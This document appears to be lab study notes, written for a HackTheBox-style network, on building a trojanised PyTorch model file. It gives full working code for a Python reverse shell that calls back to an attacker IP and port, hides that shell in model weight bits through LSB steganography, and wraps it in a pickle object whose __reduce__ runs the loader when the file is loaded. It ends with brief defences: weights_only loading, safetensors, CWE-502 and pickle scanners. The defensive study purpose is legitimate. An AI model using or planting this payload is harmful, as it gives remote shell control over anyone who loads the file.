# The Attack

Four pieces bolted into one self-contained malicious model file:

First, the **payload**: the code the attacker wants to run on the victim, here a reverse shell that dials from the victim's machine back to the attacker's listener (configured by an IP and port) and hands over an interactive shell.

Second, **hide it**: those payload bytes get embedded into the least significant bits of the big carrier tensor (`large_layer.weight`) using the `encode_lsb` tool from Section 22, so the weights barely move and the file looks like a normal model.

Third, the **trigger**, which is the weaponized pickle. A wrapper class overrides `__reduce__`. Normally `__reduce__` tells pickle how to rebuild an object; here it is made to return `(exec, (loader_code,))`, so unpickling runs attacker code instead of reconstructing anything.

Fourth, the **loader**: the string that `exec` runs. It carries the pickled state_dict, the target key, the LSB count, and its own copy of a decode routine. On load it rebuilds the dict, grabs the carrier tensor, decodes the hidden payload back out, and executes it, firing the reverse shell.

## The Payload

```python
import socket, subprocess, os, pty, sys, traceback  # Imports needed by payload

# Configure connection details for the reverse shell
# Use the IP/DNS name of the machine running the listener, accessible FROM your target instance,
HOST_IP = "10.0.0.116"  # THIS IS YOUR IP WHEN ON THE HTB NETWORK
LISTENER_PORT = 4444  # The port that you will listen for a connection on

print(f"--- Payload Configuration ---")
print(f"Payload will target: {HOST_IP}:{LISTENER_PORT}")
print(f"-----------------------------")

# The payload string itself

payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    print("[PAYLOAD] Redirecting stdio...", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    print(f"[PAYLOAD] Spawning shell: {{shell}}", file=sys.stderr); sys.stderr.flush() # May not be seen
    pty.spawn([shell]) # Start interactive shell
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1) # Force exit
"""

# Encode payload for steganography

payload_bytes_to_hide = payload_code_string.encode("utf-8")
print(f"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes.")
```

## Embedding the Payload

```python
import torch   # Ensure torch is imported
import os      # Ensure os is imported for file checks

NUM_LSB = 2    # Number of LSBs to use

# Load the legitimate state dict
legitimate_state_dict_file = "victim_model_state.pth"
if not os.path.exists(legitimate_state_dict_file):
    raise FileNotFoundError(
        f"Legitimate state dict '{legitimate_state_dict_file}' not found."
    )

print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
loaded_state_dict = torch.load(legitimate_state_dict_file)  # Load the dictionary
print("State dict loaded successfully.")

# Choose a target layer/tensor for embedding
target_key = "large_layer.weight"
if target_key not in loaded_state_dict:
    raise KeyError(
        f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
    )

original_target_tensor = loaded_state_dict[target_key]
print(
    f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
)

# Ensure the payload isn't too large for the chosen tensor
bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB  # Ceiling division
print(f"Payload requires {elements_needed} elements using {NUM_LSB} LSBs.")

if original_target_tensor.numel() < elements_needed:
    raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")

# Encode the payload into the target tensor
print(f"\nEncoding payload into tensor '{target_key}'...")
try:
    modified_target_tensor = encode_lsb(
        original_target_tensor, payload_bytes_to_hide, NUM_LSB
    )
    print("Encoding complete.")

    # Replace the original tensor with the modified one in the dictionary
    modified_state_dict = (
        loaded_state_dict.copy()
    )  # Don't modify the original loaded dict directly
    modified_state_dict[target_key] = modified_target_tensor
    print(f"Replaced '{target_key}' in state dict with modified tensor.")

except Exception as e:
    print(f"Error during encoding or state dict modification: {e}")
    raise  # Re-raise the exception
```

## The trigger

```
import pickle
import torch
import struct
import traceback
import os
import pty
import socket
import sys
import subprocess

class TrojanModelWrapper:
    """
    A malicious wrapper class designed to act as a Trojan.
    """

    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        """
        Initializes the wrapper, pickling the state_dict for embedding.
        """
        print(
            f"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."
        )
        print(f"  [Wrapper Init] Received target_key: '{target_key}'")
        print(f"  [Wrapper Init] Received num_lsb: {num_lsb}")

        if target_key not in modified_state_dict:
            raise ValueError(
                f"target_key '{target_key}' not found in the provided state_dict."
            )
        if not isinstance(modified_state_dict[target_key], torch.Tensor):
            raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be between 1 and 8.")

        try:
            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
            print(
                f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
            )
        except Exception as e:
            print(f"--- Error pickling state_dict ---")
            print(f"Error: {e}")
            raise RuntimeError(
                "Failed to pickle state_dict for embedding in wrapper."
            ) from e

        self.target_key = target_key
        self.num_lsb = num_lsb
        print(
            "  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."
        )

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

    def __reduce__(self):
        """
        Exploits pickle deserialization to execute embedded loader code.
        """
        print(
            "\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"
        )
        print("    Preparing loader code string...")

        # Embed the decode_lsb function source code.
        decode_lsb_source = """
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count: int) -> list[int]:
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError(f"Tensor ended prematurely trying to read {count} bits.")
            current_float = tensor_flat[element_index].item();
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    try:
        length_bits = get_bits(32); length_int = 0
        for bit in length_bits: length_int = (length_int << 1) | bit
        payload_len_bytes = length_int
        if payload_len_bytes == 0: return b''
        if payload_len_bytes < 0: raise ValueError(f"Decoded negative length: {payload_len_bytes}")
        payload_bits = get_bits(payload_len_bytes * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        for bit in payload_bits:
            current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
            if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
        return bytes(decoded_bytes)
    except ValueError as e: raise ValueError(f"Embedded LSB Decode failed: {e}") from e
    except Exception as e_inner: raise RuntimeError(f"Unexpected Embedded LSB Decode error: {e_inner}") from e_inner
"""

        # Embed necessary data
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        embedded_target_key = repr(self.target_key)
        embedded_num_lsb = self.num_lsb
        print(
            f"  [Reduce] Embedding {len(self.pickled_state_dict_bytes)} bytes of pickled state_dict."
        )

        # Construct the loader code string
        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
print('[+] Trojan Wrapper: Loader code execution started.', file=sys.stderr); sys.stderr.flush()
{decode_lsb_source}
print('[+] Trojan Wrapper: Embedded decode_lsb function defined.', file=sys.stderr); sys.stderr.flush()
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {embedded_target_key}
num_lsb = {embedded_num_lsb}
print(f'[+] Trojan Wrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', file=sys.stderr); sys.stderr.flush()
try:
    print('[+] Trojan Wrapper: Deserializing embedded state_dict...', file=sys.stderr); sys.stderr.flush()
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    if not isinstance(reconstructed_state_dict, dict):
        raise TypeError("Deserialized object is not a dictionary (state_dict).")
    print(f'[+] Trojan Wrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', file=sys.stderr); sys.stderr.flush()
    if target_key not in reconstructed_state_dict:
        raise KeyError(f"Target key '{{target_key}}' not found in reconstructed state_dict.")
    payload_tensor = reconstructed_state_dict[target_key]
    if not isinstance(payload_tensor, torch.Tensor):
         raise TypeError(f"Value for key '{{target_key}}' is not a Tensor.")
    print(f'[+] Trojan Wrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', file=sys.stderr); sys.stderr.flush()
    print(f'[+] Trojan Wrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', file=sys.stderr); sys.stderr.flush()
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    print(f'[+] Trojan Wrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', file=sys.stderr); sys.stderr.flush()
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    print('[!] Trojan Wrapper: Executing final decoded payload (reverse shell)...', file=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
    print('[!] Trojan Wrapper: Payload execution initiated.', file=sys.stderr); sys.stderr.flush()

except Exception as e:
    print(f'[!!!] Trojan Wrapper: FATAL ERROR during loader execution: {{e}}', file=sys.stderr);
    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print('[+] Trojan Wrapper: Loader code sequence finished.', file=sys.stderr); sys.stderr.flush()
"""
        print("  [Reduce] Loader code string constructed with escaped inner braces.")
        print("  [Reduce] Returning (exec, (loader_code,)) tuple to pickle.")
        return (exec, (loader_code,))

print("TrojanModelWrapper class defined.")
```

### Key facts to lock in

- ==The whole thing detonates on `torch.load(..., weights_only=False)`==, because `torch.load` uses pickle and pickle calls `__reduce__`. `weights_only=True` or the `safetensors` format stops it dead.
- **Steganography is the carrier (stealth), pickle is the execution (trigger)**, and combining them lets a normal-looking, still-functional model file also own the machine.
- It runs **the instant the victim loads the model**, before the model is ever used for inference.
- The correct classification for a finding is **CWE-502, Deserialization of Untrusted Data**. Good remediation text: load models only from trusted sources, default to `weights_only=True`, prefer `safetensors`, and scan artifacts with `picklescan` or `fickling`.